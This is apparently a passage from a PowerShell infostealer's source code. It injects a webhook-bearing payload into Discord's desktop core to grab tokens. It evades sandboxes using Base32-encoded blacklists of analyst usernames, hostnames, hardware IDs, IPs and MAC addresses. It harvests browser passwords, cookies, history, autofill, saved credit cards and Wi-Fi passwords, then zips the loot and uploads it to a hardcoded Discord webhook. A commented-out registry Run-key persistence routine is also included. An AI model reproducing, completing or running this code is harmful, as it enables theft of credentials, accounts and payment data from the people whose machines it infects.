                    return $true
                }
                catch {
                    return $false
                }
            }
        }
        return $false
    }

    # For each Discord installation folder...
    foreach ($discordDir in $discordDirs) {
        if (-not (Test-Path $discordDir)) { continue }

        $coreInfo = Get-CoreInfo -DiscordDir $discordDir
        if ($null -eq $coreInfo -or $coreInfo.Count -lt 2) { continue }

        $corePath = $coreInfo[0]
        $version   = $coreInfo[1]

        # Modify the injection code.
        # Replace "discord_desktop_core-1" with the module version and "%WEBHOOK%" with the webhook URL.
        $modifiedCode = $injectionCode.Replace("discord_desktop_core-1", $version)
        $modifiedCode = $modifiedCode.Replace("%WEBHOOK%", $Webhook)

        # Write the modified code to the index.js file in the core folder.
        $indexPath = Join-Path $corePath "index.js"
        try {
            Set-Content -Path $indexPath -Value $modifiedCode -Encoding UTF8 -Force
        }
        catch {
            continue
        }

        # Restart Discord.
        Start-Discord -DiscordDir $discordDir | Out-Null
    }
}
#endregion

#region Anti-Debug checks
function Test-AntiDebug {
    # --- Helper functions for Base32 decoding ---
    function ConvertFrom-Base32 {
        param (
            [Parameter(Mandatory)]
            [string]$InputString
        )
        # Remove padding and work in uppercase.
        $inputString = $InputString.TrimEnd('=').ToUpperInvariant()
        $alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"
        $bits = ""
        foreach ($char in $inputString.ToCharArray()) {
            $index = $alphabet.IndexOf($char)
            if ($index -lt 0) { return "" }
            # Convert index to a 5–bit binary string.
            $bits += [Convert]::ToString($index, 2).PadLeft(5, '0')
        }
        $outputBytes = New-Object System.Collections.Generic.List[Byte]
        for ($i = 0; $i -le $bits.Length - 8; $i += 8) {
            $byteStr = $bits.Substring($i, 8)
            $outputBytes.Add([Convert]::ToByte($byteStr, 2))
        }
        return [System.Text.Encoding]::UTF8.GetString($outputBytes.ToArray())
    }
    function Decode-List($list) {
        return $list | ForEach-Object { if ($_ -eq "") { "" } else { ConvertFrom-Base32 $_ } }
    }

    # --- Blacklisted identifiers (Base32–encoded) ---
    $blackListedUsersBase32 = @(
        "IJZHK3TP",
        "IFSG22LONFZXI4TBORXXE===",
        "K5CECR2VORUWY2LUPFAWGY3POVXHI===",
        "IFRGE6I=",
        "NBWWC4TD",
        "OBQXIZLY",
        "KJCGQSRQINHEMZLWPJMA====",
        "NNCWKY3GJV3WO2Q=",
        "IZZGC3TL",
        "HBHGYMCDN5WE4UJVMJYQ====",
        "JRUXGYI=",
        "JJXWQ3Q=",
        "M5SW64THMU======",
        "KB4G2ZCVJ5YFM6LY",
        "HBLGS6STJU======",
        "O4YGM2TVJ5LG2Q3DKA2UC===",
        "NRWVM53KNI4WE===",
        "KBYU6TTKJBLHOZLYONJQ====",
        "GN2TE5RZNU4A====",
        "JJ2WY2LB",
        "JBCVKZKSPJWA====",
        "MZZGKZA=",
        "ONSXE5TFOI======",
        "IJ3EUQ3IKJIG443YNY======",
        "JBQXE4TZEBFG62DOONXW4===",
        "KNYWORSPMYZUO===",
        "JR2WGYLT",
        "NVUWWZI=",
        "KBQXIZKY",
        "NA3WI2ZRPBIHE===",
        "JRXXK2LTMU======",
        "KVZWK4RQGE======",
        "ORSXG5A=",
        "KJDXUY2CKV4XE6TOKJSWO==="
    )
    $blackListedPCNamesBase32 = @(
        "IJCUKNZTG4YEGLJYIMYEGLJU",
        "IRCVGS2UJ5IC2TSBJNDEMTKU",
        "K5EU4LJVIUYDOQ2PKM4UCTCS",
        "IIZTARRQGI2DELJRIM3ECLJU",
        "IRCVGS2UJ5IC2VSSKNIUYQKH",
        "KE4USQKUKJFVAUSI",
        "LBBTMNC2II======",
        "IRCVGS2UJ5IC2RBQGE4UORCN",
        "IRCVGS2UJ5IC2V2JHBBUYRKU",
        "KNCVEVSFKIYQ====",
        "JREVGQJNKBBQ====",
        "JJHUQTRNKBBQ====",
        "IRCVGS2UJ5IC2QRQKQ4TGRBW",
        "IRCVGS2UJ5IC2MKQLFFVAMRZ",
        "IRCVGS2UJ5IC2MKZGI2DGM2S",
        "K5EUYRKZKBBQ====",
        "K5HVESY=",
        "GZBTIRJXGMZUMLKDGJCDSLJU",
        "KJAUYUCIKMWVAQY=",
        "IRCVGS2UJ5IC2V2HGNGVSSST",
        "IRCVGS2UJ5IC2N2YIM3EORK2",
        "IRCVGS2UJ5IC2NKPKY4VGMCP",
        "KFQXEWTIOJSEE4DK",
        "J5JEKTCFIVIEG===",
        "IFJEGSCJIJAUYRCQIM======",
        "JJKUYSKBFVIEG===",
        "MQYWE3SKNNTFM3CI",
        "JZCVIVCZKBBQ====",
        "IRCVGS2UJ5IC2QSVI5EU6===",
        "IRCVGS2UJ5IC2Q2CI5IEMRKF",
        "KNCVEVSFKIWVAQY=",
        "KREVCSKZJRATSVCXGVGQ====",
        "IRCVGS2UJ5IC2S2BJRLESTSP",
        "INHU2UCOIFGUKXZUGA2DO===",
        "IRCVGS2UJ5IC2MJZJ5GEYVCE",
        "IRCVGS2UJ5IC2RCFGM3DSU2F",
        "IVATQQZSIUZECLKEGAYTOLJU",
        "IFEUIQKOKBBQ====",
        "JRKUGQKTFVIEG===",
        "JVAVEQ2JFVIEG===",
        "IFBUKUCD",
        "JVEUWRJNKBBQ====",
        "IRCVGS2UJ5IC2SKBKBFU4MKQ",
        "IRCVGS2UJ5IC2TSUKU3VMVKP",
        "JRHVKSKTIUWVAQY=",
        "KQYDAOJRG4======",
        "ORSXG5BUGI======"
    )
    $blackListedHWIDSBase32 = @(
        "",
        "G5AUENKDGQ4TILJTHFDDKLJUHE2DCLJZGE3DGLJUG5DDKNCEGZCDKMBRGY======",
        "GAZUIRJQGI4TILJQGQ4DALJQGVCEKLJRIEYDMLJTGUYDOMBQGA4DAMBQHE======",
        "GEYTCMJRGEYTCLJSGIZDELJTGMZTGLJUGQ2DILJVGU2TKNJVGU2TKNJVGU======",
        "GZDDGQ2BGVCUGLKCIVBTSLJUIE2EILJYGI3TILJRGEYTMOCGGY2DAMBVHA======",
        "IFCEKRKFIU4UKLKFIYYECLJWII4DILKCGE2EELKCHAZUCNJUIFDEGNJUHA======",
        "GRBTIQZUGU2DILJQGA2TALJTG4YTALJYGA2TQLKDIFBTANCGGU4TGNBUIE======",
        "GAYDAMBQGAYDALJQGAYDALJQGAYDALJQGAYDALKBIMYUMNSCIQYDIOJXGI======",
        "GAYDAMBQGAYDALJQGAYDALJQGAYDALJQGAYDALJQGAYDAMBQGAYDAMBQGA======",
        "GVBEIMRUIQ2TMLJXHA4UMLJYGQ3DQLJXINCEGLKDIFATOMRSGJBUGMJSGE======",
        "GQ4TIMZUIQ2TGLJQGIYDALJZGA3DKLJSGUYDALJWGU4TAMRVGAYEKNBTHE======",
        "GQ4TIMZUIQ2TGLJQGIYDALJZGAZTMLJSGUYDALJTGY4TAMRVGAYEMMBSGI======",
        "G43TORBYGRBDGLJYHBCDCLJUGUYUGLJZGNCTILKEGIZTKMJXG42DEMCBG4======",
        "GQ4TIMZUIQ2TGLJQGIYDALJZGAZTMLJSGUYDALJTGY4TAMRVGAYDAQZWGU======",
        "IIYTCMJSGA2DELJVGJCTQLKFGI2UELJTGY2TKLJWIE2EMNJUGE2TKRCCIY======",
        "GAYDAMBQGAYDALJQGAYDALJQGAYDALJQGAYDALKBIMYUMNSCIQYDIOCGIU======",
        "IVBDCNRZGI2EELKGII3EILJUIZATCLJYGY3DMLJRG5BDSMKGGYZEMQRTG4======",
        "IEYTKQJZGMYEGLJYGI2TCLJZGY2DKLKBIY3DGLKFGQ2UCRBXGI4EGMRQIM======",
        "GY3UKNJZGVCUELJVGRAUGLJUIZDDALKCGVCTGLJTIRATOQZXII2TIN2FGM======",
        "IM3UIMRTGM2DELKBGVCDILJWHBATCLJVHFAUGLKDIY2DARRXGM2UEMZWGM======",
        "GYZTEMBTGM2DELJQIVBDALKBIEYUCLJUIRDDKLJTIZBDGN2EIJBDANRXGA======",
        "GQ2EEOJUIQ2TMLJWGVAUELKEIMYDELJYGZATALJZHAYTIM2BG42DEM2CIY======",
        "GY3DAOBQGAZUMLKFINCTILJUHE2EKLKCGA3UKLJRIM2DMMJVIQYUIOJTIM======",
        "IQ4TCNBSGA2DELJYIY2TCLJVIVDEMLKEGVDDQLKFIU4UCRJTIQYTMMBSIE======",
        "GQ4TIMZUIQ2TGLJQGIYDALJZGAZTMLJSGUYDALJTGY4TAMRVGAYDGQKGGA======",
        "HBBDIRJYGI3TQLJVGI2UGLJXGM2DGLKCHAZDKLJSHAYECRKCINCDGQSDII======",
        "GRCDIRCEIM4TILKFGA3EGLJUGRDDILJZGVDEKLJTGNATCQKEIE2UCQZSG4======",
        "G44UCRRVGI3TSLJRGZBUMLJUGA4TILJZG42TQLKGHA4ECNRRGZCDQMKCGQ======",
        "IZDDKNZXII3TSLJXHAZEKLJQIE2EILJYGU3DQLKCGM2UCOKCG5CUENZWII======",
        "GA4EGMKFGQYDALJTIM2TMLJRGFCUCLJYGAYDALJTINCUGRKGGQZUMRKEIU======",
        "GZCUGRKBIY3TELJTGU2DQLJUG43EGLKCIQ4EILJXGMYTGNCBHEYTQMSDHA======",
        "GQ4TIMZUIQ2TGLJQGIYDALJZGAZTMLJSGUYDALJTGY4TAMRVGAYDGOBWGU======",
        "GEYTSNRQGJCTQLJZGJDDSLKCIQ2EELJYHE3TSLKEIE3DQMRSG43EIMZYGU======",
        "GEZDEMBUIQ2TMLJSHBBTALKBIIYDGLJVGFBDOLJUGRATQQRXGUZDKMRVGA======",
        "GYZUMQJTGM2DELJTGFBTOLJUIU4EKLJYGA4DSLKEIFDEMNSDIU2UKOJWG4======",
        "GM3DKQRUGAYDALJTIIZDKLJRGFCUCLJYGAYDALJTINCUGRKGGQ2DAMJQIM======",
        "IQ4EGMZQGMZDQLJRIIYDMLJUGYYTCLJYIUZUGLKFGQZTGRRUIY4TOOJUIU======",
        "GAYDAMBQGAYDALJQGAYDALJQGAYDALJQGAYDALJVGBCTKNBZGMZTSMKFIY======",
        "GAYDAMBQGAYDALJQGAYDALJQGAYDALJQGAYDALKBIMYUMNSCIQYDIOJYGY======",
        "GRBUEOBSGA2DELKCIE4EMLJRG42DQLKDHE2DCLJTGYZUGMZZGFBUCN2GGM======",
        "II3DINRUIEZEELJZGJBTOLJUII4TKLKBGJCDALKFGU2DCMBQHAYUEOBRGI======",
        "IJBDEMZTGM2DELJSIUYDCLJXGE4EMLKEGRATCLKFG5DDMOKEGAZDMNBSHA======",
        "HE4TEMKEIUZUCLJVIMYUCLKEIYYTCLJZGA3TQLJVGYZTIMJSGAYDAMBSGY======",
        "INBTKQRTIY3DELJSIEYDILJUIQZEKLKBGQ3EGLKBIE2DCQRXGA2TANZRGI======",
        "GAYDAMBQGAYDALJQGAYDALJQGAYDALJQGAYDALKBIMYUMNSCIQYDIOJYGY======",
        "IMZDIOJZGU3UCLKBIEYDQLJUIIZDCLJZGMZUMLJZGI3TCQSFIM3DGQZYGU======",
        "IJCTOOBUIQ2TMLJYGFDDKLJSIM4EILJZIQ2EELJVIFBDKNSGGA2UIOBWIU======",
        "IFBUCNRZGIYDALJTIM2EGLJRGFCUCLJYGAYDALJTINCUGRKGGQ2DAMKBIE======",
        "GNDDEOBUINATILJYIJCEMLJUHA4UELKBGI3TGLJUGFBDINCEGY3DQRRWIQ======",
        "IJBDMNCFGA2DILJYG5BECLKDHA2DOLKCIMYECLKDG44TORBRIEYTMQJVGA======",
        "GJCTMRSCGU4TILJZIQ2TKLJUGQZDILJYIU3TILKDIUZDKQJSGVCTGNSCGA======",
        "GQZECOBSGA2DELJTIYYTGLJVGEZEMLJVIUZUILJWIJDDIRSGIZCDQNJRHA======",
        "GM4ECQRTGM2DELKEG5CDALKEIZBTQLKDGU3EMLJXIZBTSRCGIU2UGOJXGI======",
        "GQ4DSNBRIFCTSLKEGUZEMLJRGFCEMLKCIJCECLJVGAZTOMZUHAZDMNBTGE======",
        "GAZTERJQGJBDILJQGQ4TSLJQGVBTGLJQHAYDMLJTIMYDOMBQGA4DAMBQHE======",
        "IRCDSQZTGM2DELKGII4DALJZIEZTCLKFIIYDILJVG44TIRJVIFCTEQRUIM======",
        "IUYDQRCFHFAUCLKDG4YDILJUGI3DCLKCGMZEILJVG5BDEQJTHE4TGNJRHA======",
        "GA3UKNBSIU2DELKGGQZUILJTIUYUGLJRIM3EELJZIM3UCQZRGIYEMM2CHE======",
        "HA4EIQZTGM2DELJRGJCTMLJXIQ3DELKCGBAUKLKDHAYEKNJXHBCTOQRQG4======",
        "GVCTGRJXIZCTALJSGYZTMLJUINBDOLJYGRDDKLJYIQZDMNJQIZDEKQZQIU======",
        "HE3EEQRTGM2DELJWGMZTKLJQIZATQLKCIEZDSLKFGFBECNKEHBDEKRSCIU======"
    )
    $blackListedIPSBase32 = @(
        "GM2S4MRSG4XDCNBWFYZDGNA=",
        "GE4TKLRXGQXDONROGIZDG===",
        "HA4C4MJTGIXDEMZRFY3TC===",
        "G44C4MJTHEXDQLRVGA======",
        "GIYC4OJZFYYTMMBOGE3TG===",
        "HA4C4MJVGMXDCOJZFYYTMOI=",
        "HA2C4MJUG4XDMMROGEZA====",
        "GE4TILRRGU2C4NZYFYYTMMA=",
        "HEZC4MRRGEXDCMBZFYYTMMA=",
        "GE4TKLRXGQXDONROGIZDE===",
        "GE4DQLRRGA2S4OJRFYYTCNQ=",
        "GM2C4MJQGUXDCOBTFY3DQ===",
        "HEZC4MRRGEXDKNJOGE4TS===",
        "G44S4MJQGQXDEMBZFYZTG===",
        "HE2S4MRVFYZDANBOHEYA====",
        "GM2C4MJUGUXDQOJOGE3TI===",
        "GEYDSLRXGQXDCNJUFY4TA===",
        "GEYDSLRRGQ2S4MJXGMXDCNRZ",
        "GM2C4MJUGEXDCNBWFYYTCNA=",
        "GIYTELRRGE4S4MRSG4XDCNJR",
        "GE4TKLRSGM4S4NJRFY2TS===",
        "GE4TELRUGAXDKNZOGIZTI===",
        "GY2C4MJSGQXDCMROGE3DE===",
        "GM2C4MJUGIXDONBOGIZDA===",
        "GE4DQLRRGA2S4OJRFYYTOMY=",
        "GEYDSLRXGQXDCNJUFY4TC===",
        "GM2C4MJQGUXDOMROGI2DC===",
        "GEYDSLRXGQXDCNJUFY4TE===",
        "GIYTGLRTGMXDCNBSFY2TA===",
        "GEYDSLRXGQXDCNJUFY4TC===",
        "HEZS4MRRGYXDONJOGIYDS===",
        "GE4TELRYG4XDEOBOGEYDG===",
        "HA4C4MJTGIXDEMRWFYZDAMY=",
        "GE4TKLRRHAYS4MJXGUXDCMBV",
        "HA4C4MJTGIXDEMRVFYYTAMA=",
        "HEZC4MRRGEXDCOJSFYYTINA=",
        "GM2C4OBTFY2DMLRRGMYA====",
        "GE4DQLRRGA2S4OJRFYYTIMY=",
        "GM2C4OBVFYZDIMZOGI2DC===",
        "GM2C4MJUGEXDENBVFYZDK===",
        "GE3TQLRSGM4S4MJWGUXDOMA=",
        "HA2C4MJUG4XDKNBOGEYTG===",
        "GE4TGLRRGI4C4MJRGQXDINI=",
        "HE2S4MRVFY4DCLRSGQ======",
        "HEZC4MRRGEXDKMROGYZA====",
        "HA4C4MJTGIXDEMRXFYZDGOA=",
        "GM2S4MJZHEXDMLRRGM======",
        "HAYC4MRRGEXDALRZG4======",
        "GM2C4OBVFYZDKMZOGE3TA===",
        "GIZS4MJSHAXDENBYFY2DM===",
        "GM2S4MRSHEXDMOJOGIZDO===",
        "GM2C4MJTHAXDSNROGIZQ====",
        "GE4TELRSGEYS4MJRGAXDONA=",
        "GM2S4MRTG4XDINZOGEZA====",
        "HA3S4MJWGYXDKMBOGIYTG===",
        "GM2C4MRVGMXDENBYFYZDEOA=",
        "GIYTELRRGE4S4MRSG4XDCNRX",
        "GE4TGLRSGI2S4MJZGMXDEMBR",
        "GM2C4MJUGUXDCOJVFY2TQ===",
        "GM2C4MJQGUXDALRSG4======",
        "GE4TKLRSGM4S4NJRFYZQ====",
        "GM2S4MJZGIXDSMZOGEYDO===",
        "GE2TILRWGEXDOMJOGUYA====",
        "GM2S4MJZHEXDCNZVFY3TQ==="
    )
    $blackListedMacsBase32 = @(
        "GAYDUMJVHI2WIORQGA5DANZ2GM2A====",
        "GAYDUZJQHI2GGOTCHA5DOYJ2GU4A====",
        "GAYDUMDDHIZDSORSMM5GGMJ2GIYQ====",
        "GAYDUMRVHI4TAORWGU5DGOJ2MU2A====",
        "MM4DUOLGHIYWIOTCGY5DKOB2MU2A====",
        "GAYDUMRVHI4TAORTGY5DMNJ2GBRQ====",
        "GAYDUMJVHI2WIORQGA5DAMB2MYZQ====",
        "GJSTUYRYHIZDIORUMQ5GMNZ2MRSQ====",
        "GAYDUMJVHI2WIORRGM5DMZB2GBRQ====",
        "GAYDUNJQHI2TMOTBGA5GIZB2GAYA====",
        "GAYDUMJVHI2WIORRGM5DMNR2MNQQ====",
        "GU3DUZJYHI4TEORSMU5DONR2GBSA====",
        "MFRTUMLGHI3GEOTEGA5DIOB2MZSQ====",
        "GAYDUZJQHI2GGORZGQ5DCZR2GIYA====",
        "GAYDUMJVHI2WIORQGA5DANJ2MQ2Q====",
        "GAYDUZJQHI2GGORUMI5DIYJ2GQYA====",
        "GQZDUMBRHIYGCORYME5DAMB2GIZA====",
        "GAYDUMLCHIZDCORRGM5DCNJ2GIYA====",
        "GAYDUMJVHI2WIORQGA5DANR2GQZQ====",
        "GAYDUMJVHI2WIORRMU5DAMJ2MM4A====",
        "GAYDUNJQHI2TMOTCGM5DGOB2GY4A====",
        "GYYDUMBSHI4TEORTMQ5GMMJ2GY4Q====",
        "GAYDUZJQHI2GGORXMI5DOYR2HA3A====",
        "GAYDUZJQHI2GGORUGY5GGZR2GAYQ====",
        "GQZDUOBVHIYDOOTGGQ5DQMZ2MQYA====",
        "GU3DUYRQHI3GMOTDME5DAYJ2MU3Q====",
        "GEZDUMLCHI4WKORTMM5GCNR2GJRQ====",
        "GAYDUMJVHI2WIORQGA5DCYZ2HFQQ====",
        "GAYDUMJVHI2WIORQGA5DCYJ2MI4Q====",
        "MI3DUZLEHI4WIORSG45GMNB2MZQQ====",
        "GAYDUMJVHI2WIORQGA5DAMJ2HAYQ====",
        "GRSTUNZZHJRTAOTEHE5GCZR2MMZQ====",
        "GAYDUMJVHI2WIOTCGY5GKMB2MNRQ====",
        "GAYDUMJVHI2WIORQGA5DAMR2GI3A====",
        "GAYDUNJQHI2TMOTCGM5DINJ2GAZQ====",
        "GEZDUODBHI2WGORSME5DMNJ2MQYQ====",
        "GAYDUMRVHI4TAORTGY5GMMB2GNRA====",
        "GAYDUMLCHIZDCORRGM5DENR2GQ2A====",
        "GNRTUZLDHJSWMORUGM5GMZJ2MRSQ====",
        "MQ2DUOBRHJSDOOTFMQ5DENJ2GU2A====",
        "GAYDUMRVHI4TAORTGY5DMNJ2GM4A====",
        "GAYDUMBTHI2DOORWGM5DQYR2MRSQ====",
        "GAYDUMJVHI2WIORQGA5DANJ2HBSA====",
        "GAYDUMDDHIZDSORVGI5DKMR2GUYA====",
        "GAYDUNJQHI2TMOTCGM5DIMR2GMZQ====",
        "GNRTUZLDHJSWMORUGQ5DAMJ2GBRQ====",
        "GA3DUNZVHI4TCORVHE5DGZJ2GAZA====",
        "GQZDUMBRHIYGCORYME5DAMB2GMZQ====",
        "MVQTUZRWHJTDCOTBGI5DGMZ2G43A====",
        "MFRTUMLGHI3GEOTEGA5DIZB2HE4A====",
        "GFSTUNTDHIZTIORZGM5DMOB2GY2A====",
        "GAYDUNJQHI2TMOTBGA5DMMJ2MFQQ====",
        "GQZDUMBRHIYGCORZGY5DAMB2GIZA====",
        "GAYDUNJQHI2TMOTCGM5DEMJ2GI4Q====",
        "GAYDUMJVHI2WIORQGA5DAMB2MIZQ====",
        "HE3DUMTCHJSTSORUGM5DSNR2G43A====",
        "MI2DUYJZHI2WCOTCGE5GGNR2MZSA====",
        "MQ2DUOBRHJSDOORYG45DANJ2MFRA====",
        "MFRTUMLGHI3GEOTEGA5DIOJ2HA3A====",
        "GUZDUNJUHIYDAORYMI5GCNR2GA4A====",
        "GAYDUNJQHI2TMOTCGM5DKMB2MRSQ====",
        "G5STUMBVHJQTGORWGI5DSYZ2GRSA====",
        "GUZDUNJUHIYDAOTCGM5GKNB2G4YQ====",
        "HEYDUNBYHI4WCORZMQ5GINJ2GI2A====",
        "GAYDUNJQHI2TMOTCGM5DGYR2ME3A====",
        "HEZDUNDDHJQTQORSGM5GMYZ2GJSQ====",
        "GVQTUZJSHJQTMOTBGQ5DINB2MRRA====",
        "GAYDUNJQHI2TMOTBMU5DMZR2GU2A====",
        "GQZDUMBRHIYGCORZGY5DAMB2GMZQ====",
        "GAYDUNJQHI2TMORZG45GCMJ2MY4A====",
        "GVSTUOBWHJSTIORTMQ5DAZB2MY3A====",
        "GAYDUNJQHI2TMOTCGM5GKYJ2MVSQ====",
        "GNSTUNJTHI4DCOTCG45DAMJ2GEZQ====",
        "GAYDUNJQHI2TMORZG45GKYZ2MYZA====",
        "GAYDUZJQHI2GGOTCGM5DKYJ2GJQQ====",
        "GEZDUZRYHI4DOOTBMI5DCMZ2MVRQ====",
        "GAYDUNJQHI2TMOTBGA5DGOB2GA3A====",
        "GJSTUNRSHJSTQORUG45DCNB2GQ4Q====",
        "GAYDUMDEHIZWCOTEGI5DIZR2GFTA====",
        "GYYDUMBSHI4TEORWGY5DCMB2G44Q====",
        "",
        "GAYDUNJQHI2TMOTBGA5GINZ2GM4A====",
        "MJSTUMBQHJSTKOTDGU5DAYZ2MU2Q====",
        "GAYDUNJQHI2TMOTBGA5DKOJ2GEYA====",
        "GAYDUNJQHI2TMOTBGA5DANR2HBSA====",
        "GAYDUZJQHI2GGOTDMI5DMMR2GA4A====",
        "GRSTUOBRHI4DCORYMU5DEMR2GRSQ===="
    )

    # --- Decode the Base32 strings ---
    $blackListedUsers    = Decode-List $blackListedUsersBase32
    $blackListedPCNames  = Decode-List $blackListedPCNamesBase32
    $blackListedHWIDS    = Decode-List $blackListedHWIDSBase32
    $blackListedIPS      = Decode-List $blackListedIPSBase32
    $blackListedMacs     = Decode-List $blackListedMacsBase32

    # --- Initialize detection flag ---
    $debugDetected = $false

    # --- Check public IP ---
    try {
        $ProgressPreference = 'SilentlyContinue'
        $publicIP = (Invoke-WebRequest -Uri "https://api64.ipify.org/" -UseBasicParsing -TimeoutSec 10).Content.Trim()
    }
    catch {
        $publicIP = ""
    }
    if ($publicIP) {
        foreach ($bip in $blackListedIPS) {
            if ($publicIP -eq $bip) {
                return $true
            }
        }
    }

    # --- Check MAC address ---
    $mac = ""
    try {
        $adapter = Get-WmiObject Win32_NetworkAdapterConfiguration -Filter "IPEnabled = True" | Where-Object { $_.MACAddress } | Select-Object -First 1
        if ($adapter) { $mac = $adapter.MACAddress }
    }
    catch {
        $mac = ""
    }
    if ($mac) {
        foreach ($bmac in $blackListedMacs) {
            if ($mac -ieq $bmac) {  return $true }
        }
    }

    # --- Check system information (HWID, username, computer name) ---
    $hwid = "None"
    try {
        $hwid = (Get-WmiObject Win32_ComputerSystemProduct).UUID.Trim()
    }
    catch {
        $hwid = "None"
    }
    $username = $env:UserName
    $hostname = $env:COMPUTERNAME

    # Use only as many entries as the shortest list among HWIDs, users, and PC names.
    $minCount = @($blackListedHWIDS.Count, $blackListedUsers.Count, $blackListedPCNames.Count) | Measure-Object -Minimum | Select-Object -ExpandProperty Minimum
    for ($i = 0; $i -lt $minCount; $i++) {
        if (($hwid -eq $blackListedHWIDS[$i]) -or 
            ($username -eq $blackListedUsers[$i]) -or 
            ($hostname -eq $blackListedPCNames[$i])) {
            return $true
        }
    }

    return $false
}
#endregion

#region Startup
# Persistence functionality disabled
function Add-StartupScript {
    # This function has been disabled to prevent persistence
    Write-Host "Persistence functionality has been disabled for security reasons."
    return $false
    
    # Original persistence code commented out below:
    <#
    try {
        # Ensure APPDATA is set.
        $appData = $env:APPDATA
        if ([string]::IsNullOrWhiteSpace($appData)) {
            throw "APPDATA environment variable not set."
        }

        # Define the working directory.
        $workingDir = Join-Path $appData "PowershellGoat"

        # Get the current script path.
        $scriptPath = $PSCommandPath
        if (-not $scriptPath) {
            throw "Current script path not available. This function must be run from a script file."
        }
        $realScriptPath = (Resolve-Path -Path $scriptPath).Path

        # Define the target script path.
        $targetScriptPath = Join-Path $workingDir "script.ps1"

        # If the script is already in the target location, exit.
        if ($realScriptPath -eq $targetScriptPath) {
            return $true
        }

        # (Re)create the working directory.
        if (Test-Path $workingDir) {
            Remove-Item -Path $workingDir -Recurse -Force -ErrorAction Stop
        }
        New-Item -ItemType Directory -Path $workingDir -Force | Out-Null

        # Copy the current script to the working directory.
        Copy-Item -Path $realScriptPath -Destination $targetScriptPath -Force -ErrorAction Stop

        # Create a batch file that launches the PowerShell script.
        $runBatPath = Join-Path $workingDir "run.bat"
        # The batch file calls powershell.exe with -NoProfile, bypassing execution policy, and hidden window.
        $batContent = "@echo off`r`n" +
                      "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$targetScriptPath`"`r`n"
        Set-Content -Path $runBatPath -Value $batContent -Encoding ASCII -Force

        # Remove any existing registry entry.
        try {
            & reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v PowershellGoat | Out-Null
        } catch {
            # If the query fails, the entry does not exist.
        } 

        # Add a new registry entry to run the batch file at startup.
        & reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v PowershellGoat /t REG_SZ /d "$runBatPath" /f | Out-Null
        return $true
    }
    catch {
        return $false
    }
    #>
}
#endregion

#region Main function
Function Main {
    $AntiDebugStatus = $true
    try{
        $AntiDebug = Test-AntiDebug
        if ($AntiDebug) {
            exit
        }
    } catch{ $AntiDebugStatus = $false }

    $webhookUrl = "https://discord.com/api/webhooks/1386838200089182319/DFvenBNwWaKMzXWX-HfhQy6IkkuGCo4yAcGKuTDs_IYpvrlWrXv0bnIyUNiV2GwYLvju"
    
    # Iterate over each browser and fetch login data, cookies, history, and autofill data
    $BrowserDataStatus = $true
    try{
        foreach ($browser in $browsers.Keys) {
            $browserPath = $browsers[$browser]
            try {
                $masterKey = Get-MasterKey -BrowserPath $browserPath
            }
            catch {
                Write-Verbose "Skipping $browser as it's not installed or accessible"
                continue
            }

            # Create output directory if it doesn't exist
            $outputDir = "./vault"
            if (Test-Path -Path $outputDir) {
                Remove-Item -Path $outputDir -Recurse -Force
            }
            New-Item -ItemType Directory -Path $outputDir | Out-Null
            # Remove existing vault.zip if it exists
            if (Test-Path -Path "vault.zip") {
                Remove-Item -Path "vault.zip" -Force
            }

            # Get Logins
            $logins = Get-BrowserLogins -BrowserPath $browserPath -Browser $browser -MasterKey $masterKey
            if ($logins) {
                $logins | ConvertTo-Json -Depth 3 | Out-File -FilePath "$outputDir\$browser-logins.json" -Encoding UTF8
            } else {
                "[]" | Out-File -FilePath "$outputDir\$browser-logins.json" -Encoding UTF8
            }

            # Get History
            $history = Get-BrowserHistory $browserPath
            if ($history) {
                $history | ConvertTo-Json -Depth 3 | Out-File -FilePath "$outputDir\$browser-history.json" -Encoding UTF8
            } else {
                "[]" | Out-File -FilePath "$outputDir\$browser-history.json" -Encoding UTF8
            }

            # Get Cookies
            $cookies = Get-BrowserCookies $browserPath
            if ($cookies) {
                $cookies | ConvertTo-Json -Depth 3 | Out-File -FilePath "$outputDir\$browser-cookies.json" -Encoding UTF8
            } else {
                "[]" | Out-File -FilePath "$outputDir\$browser-cookies.json" -Encoding UTF8
            }

            # Get Autofill Data
            $autofill = Get-AutofillData $browserPath $browser
            if ($autofill) {
                $autofill | ConvertTo-Json -Depth 3 | Out-File -FilePath "$outputDir\$browser-autofill.json" -Encoding UTF8
            } else {
                "[]" | Out-File -FilePath "$outputDir\$browser-autofill.json" -Encoding UTF8
            }

            # Get Bookmarks
            $bookmarks = Get-Bookmarks -BrowserPath $browserPath -Browser $browser
            if ($bookmarks) {
                $bookmarks | ConvertTo-Json -Depth 3 | Out-File -FilePath "$outputDir\$browser-bookmarks.json" -Encoding UTF8
            } else {
                "[]" | Out-File -FilePath "$outputDir\$browser-bookmarks.json" -Encoding UTF8
            }


            # Get Credit Cards
            $cards = Get-BrowserCards $browserPath $browser $masterKey
            if ($cards) {
                $cards | ConvertTo-Json -Depth 3 | Out-File -FilePath "$outputDir\$browser-cards.json" -Encoding UTF8
            } else {
                "[]" | Out-File -FilePath "$outputDir\$browser-cards.json" -Encoding UTF8
            }


        }
    } catch{ $BrowserDataStatus = $false }

    # --- get the wifi passwords ---
    $WifiPasswordStatus = $true
    try{
        $wifiPasswords = Get-WifiPasswords
        if ($wifiPasswords) {
            $wifiPasswords | ConvertTo-Json -Depth 3 | Out-File -FilePath "$outputDir\wifi-passwords.json" -Encoding UTF8
        } else {
            "[]" | Out-File -FilePath "$outputDir\wifi-passwords.json" -Encoding UTF8
        }
    } catch{ $WifiPasswordStatus = $false }

    # --- get the size in bytes of every file in the output directory ---
    try{
        $fileSizes = Get-ChildItem -Path $outputDir -File | ForEach-Object {
            @{
                FileName = $_.Name
                SizeBytes = $_.Length
            }
        } | ConvertTo-Json -Compress
    } catch{}

    # --- zip the output directory ---
    try{
        $zipPath = "$outputDir.zip"
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        [System.IO.Compression.ZipFile]::CreateFromDirectory($outputDir, $zipPath)
    } catch{}

    # --- username and pfp ---
    $username = "PowerShell"
    $avatar_url = "https://i.imgur.com/8NQTxD8.png"

    # --- send the zip file to discord ---
    try{
        Send-FileToDiscord -FilePath $zipPath -webhookUrl $webhookUrl -username $username -avatar_url $avatar_url
    } catch{}

    # --- send the embed to discord ---
    try{
        $embed = Create-BrowserEmbed -FileSizesJson $fileSizes
        Send-DiscordEmbed -Embed $embed -webhookUrl $webhookUrl -username $username -avatar_url $avatar_url
